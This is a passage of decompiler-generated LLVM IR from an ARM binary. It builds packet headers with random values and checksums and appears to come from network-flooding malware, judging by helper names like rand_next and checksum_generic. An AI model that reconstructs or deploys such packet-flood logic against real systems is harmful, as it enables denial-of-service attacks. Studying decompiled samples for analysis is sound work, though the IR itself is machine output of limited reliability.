dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448
  store i32 %v6_a250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a70c

dec_label_pc_a470:                                ; preds = %dec_label_pc_a294
  %v0_a470 = load i32, i32* @sb, align 4
  store i32 %v0_a470, i32* %r0.global-to-local, align 4
  %v1_a474 = call i32 @__GI___libc_close(i32 %v0_a470)
  store i32 %v1_a474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a478

dec_label_pc_a478:                                ; preds = %dec_label_pc_a394, %entry, %dec_label_pc_a470
  %v1_a480 = phi i32 [ %v3_a284, %entry ], [ %v1_a474, %dec_label_pc_a470 ], [ 0, %dec_label_pc_a394 ]
  store i32 %v27_a0b0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a480

dec_label_pc_a484:                                ; preds = %bb71
  %v1_a484 = add i32 %v4_a338, 16
  %v2_a484 = inttoptr i32 %v1_a484 to i32*
  %v3_a484 = load i32, i32* %v2_a484, align 4
  store i32 %v3_a484, i32* @r4, align 4
  %v0_a488 = call i32 @rand_next()
  store i32 %v0_a488, i32* %r0.global-to-local, align 4
  %v3_a48c = load i32, i32* %stack_var_-44, align 4
  %v5_a494 = mul i32 %v3_a48c, 24
  %v0_a49c = load i32, i32* @r4, align 4
  %v1_a49c = and i32 %v0_a49c, 16711680
  store i32 %v1_a49c, i32* %ip.global-to-local, align 4
  %v3_a4a0 = udiv i32 %v0_a49c, 16777216
  %v2_a4a4 = add i32 %v5_a494, %arg2
  store i32 %v2_a4a4, i32* %r1.global-to-local, align 4
  %v4_a4a8 = udiv i32 %v1_a49c, 256
  %v5_a4a8 = or i32 %v4_a4a8, %v3_a4a0
  store i32 %v5_a4a8, i32* %r2.global-to-local, align 4
  %v1_a4ac = and i32 %v0_a49c, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_a4ac, i32* %r3.global-to-local, align 4
  %v1_a4b0 = add i32 %v2_a4a4, 20
  %v2_a4b0 = inttoptr i32 %v1_a4b0 to i8*
  %v3_a4b0 = load i8, i8* %v2_a4b0, align 1
  %v4_a4b0 = zext i8 %v3_a4b0 to i32
  store i32 %v4_a4b0, i32* %ip.global-to-local, align 4
  %v4_a4b4 = mul i32 %v1_a4ac, 256
  %v4_a4b8 = mul i32 %v0_a49c, 16777216
  %v5_a4b4 = or i32 %v4_a4b4, %v4_a4b8
  %v5_a4b8 = or i32 %v5_a4b4, %v5_a4a8
  %v7_a4bc = lshr i32 %v0_a488, %v4_a4b0
  %v8_a4bc = add i32 %v7_a4bc, %v5_a4b8
  store i32 %v8_a4bc, i32* %r2.global-to-local, align 4
  %v1_a4c0 = and i32 %v8_a4bc, 16711680
  store i32 %v1_a4c0, i32* %r0.global-to-local, align 4
  %v1_a4cc = and i32 %v8_a4bc, 65280
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  %v5_a4d4 = call i32 @llvm.bswap.i32(i32 %v8_a4bc)
  store i32 %v5_a4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a340

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a340
  %v0_a4e0 = call i32 @rand_next()
  %v1_a4e0 = trunc i32 %v0_a4e0 to i16
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_a320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a364

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a40c
  %v3_a4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v5_a4f8 = mul i32 %v3_a4f0, 16
  %v6_a4f8 = add i32 %v5_a4f8, %v2_a0cc
  %v7_a4f8 = inttoptr i32 %v6_a4f8 to i32*
  store i32 %v0_a4f8, i32* %v7_a4f8, align 4
  %v0_a4fc = load i32, i32* @r8, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  %v3_a4fc = load i32, i32* %v2_a4fc, align 4
  store i32 %v3_a4fc, i32* %r1.global-to-local, align 4
  %v3_a504 = udiv i32 %v3_a4fc, 16777216
  %v1_a508 = and i32 %v3_a4fc, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_a508, i32* %r2.global-to-local, align 4
  %v1_a500 = udiv i32 %v3_a4fc, 256
  %v4_a50c = and i32 %v1_a500, 65280
  store i32 %v2_a0cc, i32* %r0.global-to-local, align 4
  %v4_a514 = mul i32 %v1_a508, 256
  %v0_a518 = load i32, i32* @r4, align 4
  %v3_a518 = mul i32 %v0_a518, 16
  %v2_a51c = add i32 %v3_a518, %v2_a0cc
  store i32 %v2_a51c, i32* %ip.global-to-local, align 4
  %v4_a520 = mul i32 %v3_a4fc, 16777216
  %v5_a50c = or i32 %v4_a520, %v3_a504
  %v5_a514 = or i32 %v5_a50c, %v4_a50c
  %v5_a520 = or i32 %v5_a514, %v4_a514
  store i32 %v5_a520, i32* %r3.global-to-local, align 4
  %v2_a524 = add i32 %v2_a51c, 4
  %v3_a524 = inttoptr i32 %v2_a524 to i32*
  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  %v3_a530 = udiv i32 %v3_a528, 16777216
  %v1_a534 = and i32 %v3_a528, ptrtoint (i32* @global_var_ff00.34 to i32)
  %v4_a538 = udiv i32 %v1_a52c, 256
  %v4_a53c = mul i32 %v1_a534, 256
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v4_a544 = mul i32 %v3_a528, 16777216
  %v5_a538 = or i32 %v4_a544, %v3_a530
  %v5_a53c = or i32 %v5_a538, %v4_a538
  %v5_a544 = or i32 %v5_a53c, %v4_a53c
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp101 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp101 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp76 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp76, and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960)
  %tmp77 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp77, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0, %bb78
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp102 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp102 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* @r0, align 4
  %v2_a6f4 = call i32 @rand_str(i32 %v1_a6f0, i32 %v6_a250)
  store i32 %v2_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp82 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp82, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.59 to i32), i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, ptrtoint (i16* @global_var_ffff.60 to i32)
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp83 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp83, and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960)
  %tmp84 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp84, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp85 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp86, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
